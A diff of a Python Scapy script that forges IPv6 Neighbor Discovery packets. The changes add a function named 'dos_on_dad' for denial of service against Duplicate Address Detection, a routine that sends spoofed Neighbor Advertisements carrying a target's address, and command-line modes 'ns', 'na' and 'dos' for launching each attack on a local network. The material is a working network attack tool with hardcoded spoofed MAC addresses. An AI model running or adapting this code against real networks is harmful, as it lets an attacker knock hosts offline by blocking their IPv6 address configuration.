@@ -10,9 +10,10 @@ globalDstAddr = "ff02::1"
 linkSrcAddr = "fe80::437f:2137:3e16:b6ea"
 linkDstAddr = "ff02::1"
 
+macSrcAddr = "8c:ec:4b:73:25:8d"
+macMultiAddr = "33:33:ff:e4:89:00"
 
-
-def ipv6_monitor_callback(pkt):
+def dos_on_dad(pkt):
     if IPv6 in pkt:
         if ICMPv6ND_NS in pkt:
             if pkt[IPv6].src == "::":
@@ -28,8 +29,11 @@ def ipv6_monitor_callback(pkt):
 def send_ns_pkt(pkt):
     forge_ns_pkt(linkSrcAddr)
 
+def send_na_pkt(pkt):
+    forge_na_pkt(linkSrcAddr)
+
 def forge_ns_pkt(target_address):
-    ether=Ether(src='8c:ec:4b:73:25:8d',dst='33:33:ff:e4:89:00')
+    ether=Ether(src=macSrcAddr,dst=macMultiAddr)
     a=IPv6(src="::", dst='ff02::1:ff21:41f')
     b=ICMPv6ND_NS(tgt=target_address)
     print "send NS packet target address:",target_address
@@ -40,7 +44,7 @@ def forge_na_pkt(target_address):
     if segment[0]== "fe80":
         print target_address
         return
-    ether=Ether(src='8c:ec:4b:73:25:8d',dst='33:33:00:00:00:01')
+    ether=Ether(src=macSrcAddr,dst=macMultiAddr)
     # ******* LinkLocal Address Forge ************** #
     #a=IPv6(src=linkSrcAddr, dst=linkDstAddr)
     a=IPv6(src=target_address, dst=linkDstAddr)
@@ -54,4 +58,12 @@ def forge_na_pkt(target_address):
 
 if __name__ == "__main__":
     #sniff(filter="ip6",prn=ipv6_monitor_callback,iface=ifaceName,count=1)
-    sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=3)
+    if len(sys.argv)>1:
+        if sys.argv[1] == "ns":
+            sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=3)
+        if sys.argv[1] == "na":
+            sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName,count=3)
+        if sys.argv[1] == "dos":
+            sniff(filter="ip6",prn=dos_on_dad,iface=ifaceName,count=3)
+
+
